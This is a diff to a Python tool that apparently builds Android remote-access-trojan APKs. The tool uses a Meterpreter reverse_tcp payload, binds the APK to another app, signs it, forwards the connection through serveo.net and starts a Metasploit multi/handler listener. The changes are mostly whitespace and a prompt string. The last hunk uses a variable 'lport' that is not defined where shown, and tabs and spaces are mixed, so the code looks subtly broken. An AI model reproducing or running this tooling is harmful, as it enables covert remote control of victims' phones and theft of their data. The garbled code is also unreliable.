@@ -45,10 +45,10 @@ def venom():
             print("SIGNING YOUR APK>>>>>>")
             os.system(f"apksigner sign -key febrev.pk8 -cert febrev.x509.pem {output}/{name}")
             print(f"{name} RAT apk CREATED SUCCESSFULLY IN {output} ")
-
+    
         else:
             print("INVALID INPUT>>>>>>!!!!!")
-
+      
     elif payload==2:
         bind = input("DO YOU WANT TO BIND YOUR APK WITH OTHER APP [Y/n] : ")
         if bind == "Y" or bind == "Y":
@@ -66,10 +66,10 @@ def venom():
             print("SIGNING YOUR APK>>>>>>")
             os.system(f"apksigner sign -key febrev.pk8 -cert febrev.x509.pem {output}/{name}")
             print(f"{name} RAT apk CREATED SUCCESSFULLY IN {output} ")
-
+       
         else:
             print("INVALID INPUT>>>>>>!!!!!")
-
+    
     elif payload==3:
         bind = input("DO YOU WANT TO BIND YOUR APK WITH OTHER APP [Y/n] : ")
         if bind == "Y" or bind == "Y":
@@ -94,7 +94,7 @@ def venom():
     elif payload==4:
         	malware="android/meterpreter/reverse_tcp"
 	        ip=socket.gethostbyname(socket.gethostname())
-	        port=input("ENTER THE PORT TO FORWARD OVER WAN : ")
+	        port=input("ENTER THE PORT TO FORWARD OVER WAN(the same listener port you entered) : ")
 	        path=input("enter the path to save your payload : ")	
 	        serv=socket.gethostbyname("serveo.net")
 	        name=input("ENTER THE NAME FOR YOUR PAYLOAD : ")
@@ -232,9 +232,8 @@ def venom():
          msfp=input("ENTER THE NAME OF THE PAYLOAD YOU WANNA LISTEN : ")
          print("STARTING METASPLOIT METERPRETER FOR YOUR PAYLOAD....")
          os.system("service postgresql start")
-	 lip=socket.gethostbyname(socket.gethostname())
-	 localport=input("ENTER THE PORT YOU USED IN PAYLOAD : ")
-         os.system(f"msfconsole -x 'use multi/handler; set LHOST {lip}; set LPORT {localport}; set PAYLOAD {msfp}; exploit'")
+         lip=socket.gethostbyname(socket.gethostname())
+	 os.system(f"msfconsole -x 'use multi/handler; set LHOST {lip}; set LPORT {lport}; set PAYLOAD {msfp}; exploit'")
     else:
          print("EXITING.....BYE BYE>>>>")
          os.system("exit")
